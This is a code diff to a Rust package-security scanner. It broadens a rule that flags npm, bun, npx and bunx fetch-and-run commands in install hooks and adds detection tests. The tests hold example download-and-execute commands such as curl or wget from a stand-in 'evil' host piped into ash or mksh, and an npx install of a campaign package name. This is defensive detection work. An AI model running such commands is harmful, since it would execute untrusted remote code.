@@ -1499,20 +1499,30 @@ pub fn get_builtin_rules() -> Vec<Rule> {
         Rule {
             id: "ATOMIC-002".to_string(),
             name: "Node/Bun package manager in install hook".to_string(),
-            description: "Invokes npm/pnpm/yarn/bun to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm exec`, `pnpm dlx`, and `yarn dlx` run lifecycle/remote code just like `install`.".to_string(),
+            description: "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.".to_string(),
             severity: Severity::Critical,
             category: Category::MaliciousCode,
             patterns: vec![
                 // `ci` installs the full lockfile (lifecycle scripts run);
-                // `exec`/`dlx` fetch-and-run a package (npx-style RCE). The
-                // cross terms that don't exist as real subcommands (e.g. `npm
-                // dlx`, `yarn ci`) never appear in real PKGBUILDs, so folding
-                // them into one alternation is simpler without adding FPs.
+                // `exec`/`dlx`/`rebuild` fetch-and-run or re-run lifecycle code.
+                // The cross terms that don't exist as real subcommands (e.g.
+                // `npm dlx`, `yarn ci`) never appear in real PKGBUILDs, so
+                // folding them into one alternation is simpler without adding FPs.
                 Pattern::Regex {
-                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec)\b".to_string(),
+                    pattern: r"\b(npm|pnpm|yarn)\s+(install|add|i|ci|dlx|exec|rebuild)\b".to_string(),
                 },
+                // `bun` subcommands (NOT `bunx`, which is the runner below — the
+                // `\s+` after `bun` excludes `bunx`).
                 Pattern::Regex {
-                    pattern: r"\bbunx?\s+(install|add|i|x)\b".to_string(),
+                    pattern: r"\bbun\s+(install|add|i|x)\b".to_string(),
+                },
+                // The npx-style RUNNERS: `npx <pkg>` / `bunx <pkg>` fetch and run
+                // a package directly (no subcommand) — the most common
+                // fetch-and-run RCE, and the exact form the old `bunx?\s+(install
+                // |add|i|x)` and the npm-only alternation BOTH missed. A bare
+                // runner followed by any argument is the attack.
+                Pattern::Regex {
+                    pattern: r"\b(npx|bunx)\s+\S".to_string(),
                 },
             ],
             file_types: vec![FileType::InstallScript],
@@ -2261,6 +2271,54 @@ mod tests {
         let engine = RuleEngine::default();
         let m = engine.match_content("curl -fsSL https://evil/x | dash", FileType::Pkgbuild);
         assert!(m.iter().any(|x| x.rule_id == "DLE-001"), "curl|dash must trip DLE-001: {m:?}");
+    }
+
+    #[test]
+    fn test_curl_pipe_ash_mksh_detected() {
+        // Task 4050 F2: ash (Almquist/busybox sh) and mksh were the same evasion
+        // class as dash — `curl evil | ash` / `| mksh` must trip DLE-001.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://evil/x | ash",
+            "curl -fsSL https://evil/x | mksh",
+            "wget -qO- https://evil/x | ash",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
+                "pipe-to-{s} must trip a download-and-execute rule: {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic002_catches_npx_bunx_runners() {
+        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>`)
+        // fetch-and-run a package directly — the most common RCE form, which the
+        // old npm-only alternation and `bunx?\s+(install|add|i|x)` both missed.
+        let engine = RuleEngine::default();
+        for s in [
+            "npx malicious-tool",
+            "npx -y atomic-lockfile",
+            "bunx cowsay",
+            "npm rebuild",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
+                "missed ATOMIC-002 for runner: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic002_bun_runner_not_double_reported() {
+        // The `bun` subcommand pattern and the `bunx` runner pattern must not
+        // both match the same line (they cover disjoint commands).
+        let engine = RuleEngine::default();
+        let m = engine.match_content("bunx evil-pkg", FileType::InstallScript);
+        let n = m.iter().filter(|x| x.rule_id == "ATOMIC-002").count();
+        assert_eq!(n, 1, "bunx runner should report ATOMIC-002 exactly once: {m:?}");
     }
 
     #[test]
